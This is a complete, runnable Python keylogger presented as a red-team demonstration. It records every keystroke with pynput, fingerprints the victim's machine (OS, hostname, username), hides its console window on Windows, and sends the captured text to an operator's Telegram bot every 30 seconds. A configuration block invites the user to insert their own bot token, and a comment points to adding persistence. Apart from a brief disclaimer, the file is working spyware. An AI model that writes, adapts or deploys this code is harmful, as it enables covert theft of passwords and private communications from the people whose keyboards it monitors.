# Educational / red-team demonstration only — do NOT use without authorization

import threading
import time
import platform
import os
import sys
import requests
from pynput import keyboard

# ────────────────────────────────────────────────
#   CHANGE THESE THREE VALUES
# ────────────────────────────────────────────────

TELEGRAM_BOT_TOKEN = "1234567890:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
TELEGRAM_CHAT_ID   = "123456789"               # your chat id or @yourusername
REPORT_INTERVAL    = 30                        # seconds between reports

# ────────────────────────────────────────────────

log_buffer = ""
last_send_time = time.time()
lock = threading.Lock()

def get_system_info():
    """Basic victim fingerprint"""
    try:
        return (
            f"OS: {platform.system()} {platform.release()}\n"
            f"Node: {platform.node()}\n"
            f"User: {os.getlogin()}\n"
            f"Arch: {platform.machine()}\n"
            f"Python: {platform.python_version()}"
        )
    except:
        return "System info unavailable"

def send_to_telegram(message):
    """Send text to Telegram bot"""
    if not message.strip():
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }

    try:
        r = requests.post(url, data=payload, timeout=8)
        if r.status_code != 200:
            print("Telegram send failed:", r.text)      # only visible if console exists
    except Exception as e:
        print("Telegram error:", str(e))

def flush_buffer():
    """Periodically send accumulated keys"""
    global log_buffer, last_send_time

    while True:
        time.sleep(1)

        with lock:
            if not log_buffer:
                continue

            now = time.time()
            if now - last_send_time >= REPORT_INTERVAL or len(log_buffer) > 100:
                text = f"```[{time.strftime('%Y-%m-%d %H:%M:%S')}]```\n{log_buffer}"
                threading.Thread(target=send_to_telegram, args=(text,), daemon=True).start()
                log_buffer = ""
                last_send_time = now

def on_press(key):
    global log_buffer

    try:
        char = key.char if hasattr(key, 'char') and key.char else ""
        if char:
            with lock:
                log_buffer += char
        else:
            # Special keys
            name = str(key).replace("Key.", "").upper()
            if name in ("SPACE", "TAB", "ENTER"):
                char = {"SPACE":" ", "TAB":"  ", "ENTER":"\n"}[name]
                with lock:
                    log_buffer += char
            else:
                with lock:
                    log_buffer += f"[{name}]"

    except Exception:
        with lock:
            log_buffer += "[ERR]"

def on_release(key):
    if key == keyboard.Key.esc and False:   # change to True if you want ESC to stop
        return False    # stop listener

def hide_window():
    """Hide console window on Windows"""
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass

def main():
    hide_window()

    # Optional: send system info once at start
    info = get_system_info()
    send_to_telegram(f"Keylogger started\n\n{info}")

    # Start background sender thread
    threading.Thread(target=flush_buffer, daemon=True).start()

    # Start keyboard listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    # You can add very basic persistence here (startup registry/run folder/etc.)
    # but omitted for minimal example

    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        send_to_telegram(f"Keylogger crashed:\n{str(e)}")